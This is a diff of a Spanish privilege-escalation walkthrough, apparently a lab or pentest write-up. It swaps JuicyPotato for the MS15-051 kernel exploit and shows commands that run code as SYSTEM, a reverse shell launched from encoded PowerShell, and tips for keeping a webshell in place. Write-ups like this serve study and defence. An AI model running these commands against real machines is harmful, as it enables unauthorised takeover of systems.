@@ -74,16 +74,16 @@ El usuario es `nt authority\iusr` (IIS/Apache con PHP).
 whoami /priv
 ```
 
-Si aparece `SeImpersonatePrivilege`, se sube `JuicyPotato.exe` y se usa un CLSID válido para la versión de Windows (Server 2012 R2 / 2016):
+Con `Hotfix(s): N/A` en Server 2008 R2, se sube el exploit de kernel MS15-051 (CVE-2015-1701) ya compilado y se lanza con la orden que se quiera como SYSTEM:
 
 ```cmd
-JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -c {CLSID}
+MS15-051x64.exe "whoami"        # debe devolver nt authority\system
 ```
 
 Con reverse shell:
 
 ```cmd
-JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c powershell -nop -enc <BASE64>" -t * -c {CLSID}
+MS15-051x64.exe "powershell -nop -enc <BASE64>"
 ```
 
 Alternativas: `PrintSpoofer`, `RoguePotato`, `GodPotato` según build.
@@ -97,7 +97,7 @@ Alternativas: `PrintSpoofer`, `RoguePotato`, `GodPotato` según build.
 
 - **El exploit devuelve 200 pero sin salida** → el parámetro va mal codificado; usa un PoC que acepte `--command`.
 - **`SeImpersonate` no aparece** → el webshell corre con otra identidad; revisa `whoami /priv` desde el proceso real.
-- **JuicyPotato falla con `-c`** → el CLSID no existe en esa build; prueba varios o cambia de herramienta.
+- **Arquitectura equivocada** → la caja es x64; la build x86 falla en silencio.
 - **El webshell desaparece** → el CMS limpia `sites/default/files`; súbelo a otra ruta escribible.
 
 ## Mitigaciones y detección
